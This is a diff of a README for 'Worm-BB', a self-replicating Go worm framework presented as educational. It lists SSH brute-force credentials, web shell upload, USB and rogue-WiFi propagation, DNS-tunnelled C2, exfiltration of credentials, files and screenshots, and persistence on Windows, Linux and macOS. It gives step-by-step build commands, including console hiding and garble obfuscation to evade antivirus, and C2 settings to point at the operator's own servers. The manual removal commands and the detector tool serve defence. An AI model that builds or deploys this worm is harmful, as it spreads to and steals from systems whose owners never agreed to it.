@@ -1,20 +1,20 @@
-# Worm-BB: Advanced Self-Replicating Framework for Red & Blue Teams
+# Worm-BB: Advanced Self-Replicating Worm for Red & Blue Teams
 
-![ek0ms Banner](https://img.shields.io/badge/ek0ms-certified_ethcial_hacker-black)
+![ek0ms Banner](https://img.shields.io/badge/ek0ms-certified_ethical_hacker-black)
 
 ![image1(1)](https://github.com/user-attachments/assets/c4cd71ae-1fce-4892-a3ae-c6fd9fe8ba3d)
 
-
 **Educational Purpose Only**
 
-Worm-BB is a research-grade, multi-platform worm framework written in Go. It demonstrates modern autonomous propagation techniques, stealth command & control, USB and WiFi-based spreading, web shell persistence, and data exfiltration. The companion detection and removal tool helps blue teams identify and eradicate Worm-BB infections in authorized environments.
+Worm-BB is a research‑grade, multi‑platform worm framework written in Go. It demonstrates modern autonomous propagation techniques, stealth command & control, USB and WiFi‑based spreading, web shell persistence, and data exfiltration. The companion detection and removal tool helps blue teams identify and eradicate Worm‑BB infections in authorised environments.
 
-**This repository is for authorized security testing, research, and defense training only.** 
+**This repository is for authorised security testing, research, and defence training only.**
+
 ---
 
 ## Overview
 
-Worm-BB implements the classic worm trinity: **Scan → Exploit → Replicate**. It spreads across networks, USB drives, and rogue WiFi access points, establishes deep persistence on Windows and Linux, and communicates with a C2 server via WebSockets, DNS tunneling, and HTTP beacons. The detector tool (`worm_bb_detector`) scans for all known Worm-BB artifacts – processes, files, registry keys, scheduled tasks, cron jobs, systemd services, WMI subscriptions, USB autorun files, and network multicast traffic.
+Worm‑BB implements the classic worm trinity: **Scan → Exploit → Replicate**. It spreads across networks, USB drives, and rogue WiFi access points, establishes deep persistence on Windows, Linux, and macOS, and communicates with a C2 server via WebSockets, DNS tunnelling, and HTTP beacons. The detector tool (`worm_bb_detector`) scans for all known Worm‑BB artifacts – processes, files, registry keys, scheduled tasks, cron jobs, systemd services, WMI subscriptions, USB autorun files, and network multicast traffic.
 
 Both components are written entirely in Go, making them cross‑platform, statically linked, and difficult to detect by signature‑based AVs (when compiled with obfuscation).
 
@@ -26,15 +26,15 @@ Both components are written entirely in Go, making them cross‑platform, static
 
 | Module               | Description |
 |----------------------|-------------|
-| **SSH Bruteforce**   | Default credential list (`root:root`, `admin:admin`, etc.) + payload deployment. |
+| **SSH Bruteforce**   | Default credential list (`root:root`, `admin:admin`, `pi:raspberry`, etc.) + payload deployment. |
 | **SMB/EternalBlue**  | Detection of port 445; exploit hooks ready. |
 | **WebShell**         | Uploads PHP/ASP/Python shells via PUT, POST, FTP, WebDAV; backdoor deployment. |
-| **USB Propagation**  | Monitors removable drives, copies worm, creates `autorun.inf` (Windows) or udev rules (Linux), hides files. |
+| **USB Propagation**  | Monitors removable drives, copies worm, creates `autorun.inf` (Windows), launchd plist (macOS), udev rules (Linux), hides files. |
 | **WiFi Evil Portal** | Rogue AP with DNS spoofing, captive portal, deauth attack; forces worm download. |
 | **P2P Coordination** | Multicast peer discovery (`239.255.42.42:4242`), leader election, population management. |
-| **C2 Channels**      | WebSocket (WSS), DNS tunneling (A/TXT queries), HTTP/S beacons with random User-Agent. |
+| **C2 Channels**      | WebSocket (WSS), DNS tunnelling (A/TXT queries), HTTP/S beacons with random User‑Agent. |
 | **Data Exfiltration**| Batched, AES‑encrypted exfil to MySQL or HTTPS endpoint; steals creds, files, screenshots. |
-| **Persistence**      | Windows: Run keys, scheduled tasks, WMI, startup folder. Linux: crontab, systemd, SSH keys, udev. |
+| **Persistence**      | Windows: Run keys, scheduled tasks, WMI, Startup folder. Linux: crontab, systemd, init.d, rc.local, udev, SSH keys. macOS: launchd, cron. |
 
 ### Detection & Removal Tool (`worm_bb_detector.go`)
 
@@ -62,10 +62,11 @@ Remediation actions are generated for each finding: kill processes, delete files
 ### Prerequisites
 
 - Go 1.16+ (`go version`)
-- Optional dependencies for WiFi module (Linux only):
+- **Optional dependencies** for USB and WiFi modules (Linux only):
   ```bash
   sudo apt install libnl-3-dev libnl-genl-3-dev libpcap-dev hostapd dnsmasq
   ```
+  (On ARM/embedded, these packages are also available via `apt`.)
 - For cross‑compilation to Windows (optional):
   ```bash
   sudo apt install gcc-mingw-w64-x86-64
@@ -75,9 +76,6 @@ Remediation actions are generated for each finding: kill processes, delete files
 
 ```bash
 go mod init worm_bb
-```
-
-```bash
 go get -u github.com/google/gousb
 go get -u github.com/gorilla/websocket
 go get -u github.com/miekg/dns
@@ -89,19 +87,26 @@ go get -u golang.org/x/sys/windows/registry
 
 ### Compile the Worm (`worm.go`)
 
+The worm uses CGO for USB and WiFi components; ensure CGO is enabled on relevant platforms.
+
 ```bash
 # Linux (x86_64)
 CGO_ENABLED=1 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o worm_bb worm.go
+
+# Linux (ARMv7, e.g. Raspberry Pi)
+CGO_ENABLED=1 GOOS=linux GOARCH=arm GOARM=7 CC=arm-linux-gnueabihf-gcc go build -ldflags="-s -w" -o worm_bb_arm worm.go
+
+# Linux (ARM64)
+CGO_ENABLED=1 GOOS=linux GOARCH=arm64 CC=aarch64-linux-gnu-gcc go build -ldflags="-s -w" -o worm_bb_arm64 worm.go
 
 # Windows (x86_64) – hide console
 CGO_ENABLED=1 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build -ldflags="-s -w -H=windowsgui" -o worm_bb.exe worm.go
 
 # macOS (Intel)
 CGO_ENABLED=0 GOOS=darwin GOARCH=amd64 go build -ldflags="-s -w" -o worm_bb_mac worm.go
-
-# ARM (Raspberry Pi)
-CGO_ENABLED=1 GOOS=linux GOARCH=arm GOARM=7 CC=arm-linux-gnueabihf-gcc go build -ldflags="-s -w" -o worm_bb_arm worm.go
 ```
+
+> **Note**: On Windows, CGO is required for USB detection (`gousb`). If you don't need USB, you can disable CGO, but the USB propagator will be skipped.
 
 ### Compile the Detector (`worm_bb_detector.go`)
 
@@ -127,15 +132,17 @@ garble -literals -tiny -seed=random build -ldflags="-s -w" -o worm_bb_obf worm.g
 
 ## Usage – Worm Framework
 
-**Before you run:** Change the C2 constants in `worm.go` to point to your own infrastructure (WebSocket, DNS domain, exfil endpoint). 
+**Before you run:** Change the C2 constants in `worm.go` to point to your own infrastructure:
 
 ```go
 const (
-    C2_WEBSOCKET = "wss://your-c2.com:8443/ws"
-    C2_DNS_DOMAIN = "your-c2.com"
+    C2_WEBSOCKET      = "wss://your-c2.com:8443/ws"
+    C2_DNS_DOMAIN     = "your-c2.com"
     DATA_EXFIL_SERVER = "https://your-c2.com:8443/upload"
 )
 ```
+
+Also update the WiFi SSID and other parameters as needed.
 
 ### Run the Worm
 
@@ -152,7 +159,7 @@ worm_bb.exe
 
 On first run, the worm:
 1. Checks for existing instances (mutex, lock file, listening ports).
-2. Installs persistence (registry, crontab, systemd, etc.).
+2. Installs persistence (registry, crontab, systemd, launchd, etc.).
 3. Joins the P2P multicast group.
 4. Begins scanning and propagating.
 
@@ -169,25 +176,35 @@ The worm automatically selects a propagation strategy based on local population:
 
 To remove the worm after testing, either run the detection tool (see next section) or manually delete:
 
+**Linux**
 ```bash
-# Linux
 pkill -f system-update
 rm -f /tmp/system-update /etc/systemd/system/system-update.service
 crontab -l | grep -v system-update | crontab -
 rm -f /etc/udev/rules.d/99-usb-autorun.rules
+rm -f /etc/init.d/system-update
+```
 
-# Windows
+**Windows**
+```cmd
 taskkill /F /IM SystemUpdate.exe
 schtasks /delete /tn SystemUpdateTask /f
 reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SystemUpdate /f
 del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SystemUpdate.exe"
 ```
 
+**macOS**
+```bash
+launchctl unload ~/Library/LaunchAgents/com.apple.systemupdate.plist
+rm ~/Library/LaunchAgents/com.apple.systemupdate.plist
+crontab -l | grep -v systemupdate | crontab -
+```
+
 ---
 
 ## Usage – Detection & Removal Tool
 
-The detector scans for all Worm-BB indicators and optionally removes them.
+The detector scans for all Worm‑BB indicators and optionally removes them.
 
 ### Basic Scan (Interactive)
 
@@ -248,16 +265,15 @@ Version: 1.0
 
 ## Ethical & Legal Disclaimer
 
-**This software is provided for educational and authorized security testing only.**
+**This software is provided for educational and authorised security testing only.**
 
 ![image1(1)](https://github.com/user-attachments/assets/4e693f4d-10f3-43e2-b204-2c1585e03535)
 
 ---
 
-# Read my wormBB research, walk thru and articles here:
+# Read my Worm‑BB research, walkthroughs and articles here:
 
-https://ek0mssavi0r.dev
-
-https://medium.com/@ekoms1/the-fascinating-world-of-self-replicating-worms-0e6ad768a001
-
-https://substack.com/@ek0mssavi0r/p-193527720
+- https://churchofmalware.org/articles/wormBB_article_md
+- https://ek0mssavi0r.dev  
+- https://medium.com/@ekoms1/the-fascinating-world-of-self-replicating-worms-0e6ad768a001  
+- https://substack.com/@ek0mssavi0r/p-193527720
